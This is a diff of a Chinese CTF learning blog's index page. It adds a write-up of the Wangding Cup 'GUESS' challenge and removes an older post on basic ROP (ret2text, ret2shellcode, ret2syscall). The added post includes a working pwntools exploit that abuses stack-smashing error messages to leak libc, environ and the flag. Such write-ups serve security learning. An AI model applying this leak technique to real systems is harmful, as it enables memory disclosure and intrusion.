@@ -252,6 +252,197 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/23/pwn学习（8）smashes练习及回顾/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Asa9ao">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Asa9ao">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/11/23/pwn学习（8）smashes练习及回顾/" itemprop="url">pwn学习（8）smashes练习及一周总结</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-23T20:27:19+08:00">
+                2018-11-23
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index">
+                    <span itemprop="name">pwn</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>依旧是被各种课塞满的一天……在实验室的一下午其实也没干啥，简单看了一下ctf wiki的中级ROP，主要是想利用周六周末把ROP这部分的理论看完，然后就是做了几道题目，有麻烦一点的也有简单的，主要还是这一周的巩固。</p>
+<h1 id="stack-smashes练习"><a href="#stack-smashes练习" class="headerlink" title="stack smashes练习"></a>stack smashes练习</h1><p>题目是网鼎杯的GUESS，算是对stack smashes这个技术的进阶版应用吧，比起ctf wiki给的例题是难了不少，下面就来简单看一下吧<br><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fxianon45dj312m0n079m.jpg" alt=""><br>首先保护机制就开启了不少，canary、nx都是开启的，ida中很容易看出有栈溢出漏洞，理所当然的没有/bin/sh字符串，也没有system函数。程序的逻辑很简单，让我们输入三次，但要注意因为太调用了fork函数，这三次其实是三个相同的独立过程。说他相同是因为他们的栈结构、逻辑等等都是一样的，说它独立是因为你哪怕因为canary被覆盖搞崩了其中一个，另外两个也会正常运行。</p>
+<p>看了一圈没有leak出canary的机会，那我们就考虑利用smashes来get到点信息，我们首先来简单的调试一下程序，之前做过类似的题目了，我们现在main函数下段来找一下arg0的位置</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fxiayuqsnmj313001ojsj.jpg" alt=""></p>
+<p>拿到了arg0的位置，接着尝试在文件操作处下段，主要目的是看看读到的文件内容被存储在了哪里</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fxib12tuidj30mw02iq3m.jpg" alt=""><br>明显文件的内容被存储到了栈上，那我们就可以想到可以利用smashes的信息来输出栈上的flag。</p>
+<p>程序给了三次输入的机会，也就是三个smashes的机会，最终我们的目标是输出栈上的值，虽然开启了保护，但我们知道偏移是一定的，所以我们可以找到flag的偏移，然后只要找到基准值就可以算出来flag的真实地址了，那这个基准值是什么呢？答案就是*environ，他指向了栈的环境变量的位置，而我们可以利用libc来获取到environ的位置。</p>
+<p>那就说明我们要分三步走：</p>
+<ul>
+<li>利用smashes获取libc中的函数，比如puts</li>
+<li>利用smashes获取environ</li>
+<li>利用smashes获取flag</li>
+</ul>
+<p>那就来看看exp吧</p>
+<pre><code>from pwn import *
+arg0_addr = 0x7fffffffdf68
+input_addr = 0x7fffffffde40
+#context.log_level = &apos;debug&apos;
+p = process(&apos;./GUESS.dms&apos;)
+elf = ELF(&apos;./GUESS.dms&apos;)
+e = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)
+
+flag_addr = 0x7fffffffde10
+puts_addr = 0x602020
+p.recvuntil(&apos;flag&apos;)
+payload = (arg0_addr - input_addr)*&apos;a&apos; +p64(puts_addr)
+p.sendline(payload)
+p.recvuntil(&apos;*** stack smashing detected ***: &apos;)
+puts_addr = u64(p.recv(6).ljust(8,&apos;\x00&apos;))
+log.info(hex(puts_addr))
+
+libc = puts_addr - e.symbols[&apos;puts&apos;]
+environ_addr = libc + e.symbols[&apos;__environ&apos;]
+log.info(hex(libc))
+
+p.recvuntil(&apos;flag&apos;)
+p.sendline((arg0_addr - input_addr)*&apos;a&apos; + p64(environ_addr))
+p.recvuntil(&apos;*** stack smashing detected ***: &apos;)
+stack = u64(p.recv(6).ljust(8, &apos;\x00&apos;))
+log.info(hex(stack))
+
+flag_addr = stack - 0x168
+
+p.recvuntil(&apos;flag&apos;)
+p.sendline((arg0_addr - input_addr)*&apos;a&apos; + p64(flag_addr))
+
+p.interactive()
+</code></pre><p>各处都不难，位移需要注意的地方是flag偏移值的计算方式，我们运行起来之后可以在environ处下段点，然后查看stack信息，找到flag字符串的位置手动计算一下就好了.</p>
+<h1 id="简单总结"><a href="#简单总结" class="headerlink" title="简单总结"></a>简单总结</h1><p>这一周主要是学习了基础的ROP和花式溢出，另外还有一些格式化字符串漏洞的相关知识，当然除此之外还有一些pwntools的使用技巧和peda的调试技巧，也不知道这样的速度合不合适，但自己感觉需要好好总结回顾一下了，之后会利用周六把这周的东西重新捋一遍，看看还有没有什么新的发现或者是遗漏。</p>
+<p>sucessful</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/22/pwn学习（7）花式栈溢出2/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
@@ -2032,188 +2223,13 @@ p.interactive()
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/18/pwn学习（1）/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Asa9ao">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Asa9ao">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/11/18/pwn学习（1）/" itemprop="url">pwn学习（1）</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-18T17:36:37+08:00">
-                2018-11-18
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
-                  <a href="/categories/pwn/" itemprop="url" rel="index">
-                    <span itemprop="name">pwn</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>虽然自己选择了病毒分析这个方向，但ctf比赛还是要打的，只做re的话未免太过单一，于是抽出时间来学习一下pwn的基础知识，做点题练练手。第一天主要是接触了pwn中的栈溢出部分的入门知识，也就是对应了ctf wiki上的基本ROP部分，简单的做个总结吧</p>
-<h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><p>原理说起来并不难，都知道程序的函数最后会进行return操作，将eip（64位程序中是rip）设置为函数调用者的地址，也就是我们说的设置返回地址，而我们可以利用程序中的一些“无限制”的读取函数来覆盖掉返回地址，而当我们设置好了合适的大小时，我们就可以将eip随意设置成我们想要执行的函数的地址，而如果这个函数恰恰程序又给我们提供了的话，就实现了ret2text，简单说就是控制程序执行他本身原有的代码。当然，我们进行控制的时候也可以利用“零碎”的代码组成我们想要的，这是后话了。</p>
-<p>例子我们就使用ctf wiki上提供的ret2text，因为是我们的第一个pwn题目，所以我们来仔细进行一下每一步的总结。</p>
-<p>首先我们可以用peda自带的checksec函数来检查程序的保护机制（由于保护机制我后期想深入进行研究所以这里就不再赘述了，之后弄个详细的总结）</p>
-<p><img src="https://i.loli.net/2018/11/18/5bf138f88b893.jpg" alt=""></p>
-<p>可以看到开启了NX（又叫DEP），也就是说栈上的数据不可以被执行了。</p>
-<p>紧接着我们用ida打开简单分析一下程序</p>
-<p><img src="https://i.loli.net/2018/11/18/5bf149a905c1b.jpg" alt="2.jpg"></p>
-<p>很显然gets这里存在栈溢出漏洞，我们可以通过s对于ebp的偏移值直接计算出来我们的ret的地址，当然也可以使用peda中的工具，这里为了熟练一下工具的使用我就用一下工具吧</p>
-<p><img src="https://i.loli.net/2018/11/18/5bf14a1323ae9.jpg" alt="3.jpg"></p>
-<p>通过peda的pattern create xxx可以生成xxx个随机字符，我们就尝试用这个来溢出函数进而找到函数的返回地址（因为返回地址被我们的垃圾数据覆盖了，所以函数无法正常返回，我们就可以通过这一步的错误确定返回地址相对于我们的s的偏移量）</p>
-<p><img src="https://i.loli.net/2018/11/18/5bf14a116dcf2.jpg" alt="4.jpg"></p>
-<p>使用pattern offset xxx可以查看到相对于xxx的偏移量，当然由于这里算出来的是ebp的，对于堆栈结构已经不陌生的我们就知道了，加4（64位程序+8）也就是我们的返回地址</p>
-<p><img src="https://i.loli.net/2018/11/18/5bf14a12cfb6a.jpg" alt="5.jpg"></p>
-<p>我们在ida中查看到了程序中自带了system(“/bin/sh”/)函数，那我们直接拿这玩意的地址去填充原来函数的返回地址就好了，那我们就来写exp了</p>
-<p>successful</p>
-<h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><p>在知道了ret2text的原理后这个就很好理解了，之前我们是借助程序提供的可以拿到shell的函数来实现pwn的，那万一程序中没有提供咋办？其实也很简单，我们可以在恰当的位置放上自己的shellcode然后去执行它，当然我们要提前知道我们可以布置shellcode的位置，毕竟我们是要运行这段shellcode，所以起码你放的地方得有执行的权限，比如上面那个题目，开启了NX，你要是把shellcode布置在栈上就完蛋了。</p>
-<p>前期的操作就不再赘述了，我们用ida打开程序进行一下简单的分析</p>
-<p><img src="https://i.loli.net/2018/11/18/5bf14a1330921.jpg" alt="6.jpg"></p>
-<p>主要函数部分如图所示，可以看懂栈溢出很明显，但更有趣的是下边的一句，它将我们的输入的0x64个字符复制到了buf2，我们点进去看看buf2是个什么东西</p>
-<p><img src="https://i.loli.net/2018/11/18/5bf14a11c8291.jpg" alt="7.jpg"></p>
-<p>可以看到buf2是bss段的一个数组，但按照我们上面说的，我们需要把shellcode布置在有执行权限的地方，而这里是否有执行权限呢？我们可以通过peda的vmmap来看一看</p>
-<p><img src="https://i.loli.net/2018/11/18/5bf14a1480f90.jpg" alt="8.jpg"></p>
-<p>果然这一段是可执行的，那接下来的任务就简单了，只要我们输入shellcode，并且通过最后的返回地址返回到buf2的位置就可以实现pwn，下面是exp</p>
-<p><img src="https://i.loli.net/2018/11/18/5bf14a133cd29.jpg" alt="9.jpg"></p>
-<p>successful</p>
-<h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><p>因为有逆向的基础，所以这个说起来也并不难，主要就是控制程序执行系统调用，关于什么是系统调用就不再提了，可以简单的看做是一个信号弹，这个信号一来系统就知道有事要干了，但具体干什么就由信号弹的颜色啊、声响啊等等各个方面综合决定了。linux中的这个信号弹就是int 80h，基本过程如下图所示</p>
-<p><img src="https://i.loli.net/2018/11/18/5bf14a1387ef5.jpg" alt="10.jpg"></p>
-<p>而pwn一般都是要去执行/bin/sh的，那就需要用系统调用号为0xb的execve了，这个函数有三个参数，分别用ebx、ecx和edx保存，其中第一个是字符串/bin/sh，其余两个是0。</p>
-<p>那我们如何去控制这几个寄存器的值呢？那就要用到gadgets了，我们利用一个个片段去拼凑出来我们需要的东西，比如，改变eax的值，我们可以用pop eax的方式去实现，只要栈上的值我们提前设置好就成了，那如何找到这些gadgets呢？我们可以利用ROPgadget这个工具</p>
-<p><img src="https://i.loli.net/2018/11/18/5bf14a14928cc.jpg" alt="11.jpg"></p>
-<p><img src="https://i.loli.net/2018/11/18/5bf14a970040d.jpg" alt="12.jpg"></p>
-<p><img src="https://i.loli.net/2018/11/18/5bf14a96e5b9e.jpg" alt="13.jpg"></p>
-<p><img src="https://i.loli.net/2018/11/18/5bf14a978d54f.jpg" alt="14.jpg"></p>
-<p>万事具备，只欠脚本！</p>
-<p><img src="https://i.loli.net/2018/11/18/5bf14a97391b2.jpg" alt="15.jpg"></p>
-<p>这里要注意我们的flat里面需要有一定的顺序，可以认为就是个放到的栈结构，最上面的是我们的系统调用，前面对于eax和其余三个寄存器的pop操则可以更换顺序（毕竟都是到int_80才开始使用的，前面的顺序也就无关紧要了）</p>
-<p>successful</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
+  <nav class="pagination">
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
+  </nav>
+
 
 
           </div>
@@ -2257,7 +2273,7 @@ p.interactive()
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-count">11</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
